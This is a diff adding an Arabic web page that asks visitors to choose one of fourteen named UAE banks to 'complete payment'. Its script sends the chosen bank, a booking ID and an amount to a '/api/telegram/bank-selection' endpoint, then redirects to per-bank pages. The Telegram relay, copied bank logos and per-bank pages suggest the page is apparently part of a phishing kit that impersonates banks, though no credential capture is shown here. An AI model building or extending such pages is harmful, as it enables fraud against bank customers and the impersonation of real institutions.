@@ -1,0 +1,204 @@
+
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>اختر البنك</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f6f9;
+            margin: 0;
+            padding: 20px;
+            direction: rtl;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .header h1 {
+            font-size: 2.5em;
+            color: #333;
+        }
+
+        .header p {
+            font-size: 1.2em;
+            color: #666;
+        }
+
+        .bank-selection-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+            gap: 25px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .bank-item {
+            background-color: #fff;
+            border-radius: 12px;
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.08);
+            text-align: center;
+            padding: 20px;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            text-decoration: none;
+            color: inherit;
+        }
+
+        .bank-item:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 12px 24px rgba(0, 0, 0, 0.12);
+        }
+
+        .bank-item img {
+            max-width: 100px;
+            height: auto;
+            margin-bottom: 15px;
+            border-radius: 8px;
+        }
+
+        .bank-item h3 {
+            font-size: 1.1em;
+            color: #333;
+            margin: 0;
+        }
+
+        @media (max-width: 768px) {
+            .bank-selection-grid {
+                grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+                gap: 20px;
+            }
+
+            .header h1 {
+                font-size: 2em;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .bank-selection-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <h1>اختر البنك الذي تفضله</h1>
+        <p>يرجى تحديد البنك لإتمام عملية الدفع</p>
+    </div>
+
+    <div class="bank-selection-grid">
+        <a href="banks/3.html" class="bank-item" data-bank-id="2">
+            <img src="bank_files/ec1d5e_2bfe2be0588b48efb67a9822d0886934_mv2.png" alt="مصرف عجمان">
+            <h3>مصرف عجمان</h3>
+        </a>
+        <a href="banks/4.html" class="bank-item" data-bank-id="12">
+            <img src="banks/adib.png" alt="مصرف ابو ظبي الاسلامي">
+            <h3>مصرف أبوظبي الإسلامي</h3>
+        </a>
+        <a href="banks/2.html" class="bank-item" data-bank-id="4">
+            <img src="bank_files/ec1d5e_57f13e8bcbdb419ca51adb805cc4cf1f_mv2.jpg" alt="بنك دبي الاسلامي">
+            <h3>بنك دبي الإسلامي</h3>
+        </a>
+        <a href="banks/6.html" class="bank-item" data-bank-id="11">
+            <img src="bank_files/HSBC-Logo-Membership.png" alt="بنك HSBC">
+            <h3>بنك HSBC</h3>
+        </a>
+        <a href="banks/8.html" class="bank-item" data-bank-id="8">
+            <img src="bank_files/ec1d5e_cf5ab8e9c26b45ab9c8403dc385f3f1a_mv2.jpg" alt="مصرف الشارقة الاسلامي">
+            <h3>مصرف الشارقة الإسلامي</h3>
+        </a>
+        <a href="banks/5.html" class="bank-item" data-bank-id="6">
+            <img src="bank_files/ec1d5e_21496a76eddc4b5d88f5490c46b99749_mv2.jpg" alt="بنك ابو ظبي التجاري">
+            <h3>بنك أبوظبي التجاري</h3>
+        </a>
+        <a href="banks/13.html" class="bank-item" data-bank-id="10">
+            <img src="bank_files/ec1d5e_f7d640b391f545538945b33eafb04d03_mv2.jpg" alt="بنك دبي التجاري">
+            <h3>بنك دبي التجاري</h3>
+        </a>
+        <a href="banks/12.html" class="bank-item" data-bank-id="1">
+            <img src="bank_files/ec1d5e_1c3e0ca031e047199f62ac91ef2bf774_mv2.jpg" alt="بنك راس الخيمة الوطني">
+            <h3>بنك رأس الخيمة الوطني</h3>
+        </a>
+        <a href="banks/10.html" class="bank-item" data-bank-id="3">
+            <img src="bank_files/ec1d5e_8a42ed870a994c4cab7b52d698bb6f22_mv2.jpg" alt="بنك الفجيرة الوطني">
+            <h3>بنك الفجيرة الوطني</h3>
+        </a>
+        <a href="banks/7.html" class="bank-item" data-bank-id="13">
+            <img src="bank_files/IMG_20241118_091818_229.jpg" alt="بنك ابو ظبي الاول">
+            <h3>بنك أبوظبي الأول</h3>
+        </a>
+        <a href="banks/9.html" class="bank-item" data-bank-id="9">
+            <img src="bank_files/ec1d5e_dce5445978584fb999ae619dbc9c0923_mv2.jpg" alt="الامارات الاسلامي">
+            <h3>الإمارات الإسلامي</h3>
+        </a>
+        <a href="banks/14.html" class="bank-item" data-bank-id="5">
+            <img src="bank_files/ec1d5e_9178b1bab14641be86ec3e5e6d423deb_mv2.jpg" alt="بنك الامارات دبي الوطني">
+            <h3>بنك الإمارات دبي الوطني</h3>
+        </a>
+        <a href="banks/1.html" class="bank-item" data-bank-id="14">
+            <img src="bank_files/mashreq.jpg" alt="المشرق">
+            <h3>المشرق</h3>
+        </a>
+        <a href="banks/11.html" class="bank-item" data-bank-id="7">
+            <img src="bank_files/ec1d5e_c9da68b1c907412b8a592aae7d894832_mv2.jpg" alt="البنك التجاري الدولي">
+            <h3>البنك التجاري الدولي</h3>
+        </a>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const bookingId = urlParams.get("bookingId");
+            const amount = urlParams.get("amount");
+
+            document.querySelectorAll(".bank-item").forEach(link => {
+                link.addEventListener("click", function(event) {
+                    event.preventDefault();
+                    const bankId = this.dataset.bankId;
+                    const bankName = this.querySelector("h3").textContent;
+
+                    // إرسال البيانات إلى الخادم
+                    fetch("/api/telegram/bank-selection", {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({
+                            bankId: bankId,
+                            bankName: bankName,
+                            bookingId: bookingId,
+                            amount: amount
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log("Bank selection sent:", data);
+                        // تعديل الرابط للانتقال إلى الصفحة التالية مع تمرير البيانات
+                        const nextUrl = new URL(link.href, window.location.origin);
+                        nextUrl.searchParams.set("bookingId", bookingId);
+                        nextUrl.searchParams.set("amount", amount);
+                        nextUrl.searchParams.set("bankId", bankId);
+                        window.location.href = nextUrl.toString();
+                    })
+                    .catch(error => {
+                        console.error("Error sending bank selection:", error);
+                        // الانتقال حتى لو فشل الإرسال
+                        const nextUrl = new URL(link.href, window.location.origin);
+                        nextUrl.searchParams.set("bookingId", bookingId);
+                        nextUrl.searchParams.set("amount", amount);
+                        nextUrl.searchParams.set("bankId", bankId);
+                        window.location.href = nextUrl.toString();
+                    });
+                });
+            });
+        });
+    </script>
+
+</body>
+</html>
+
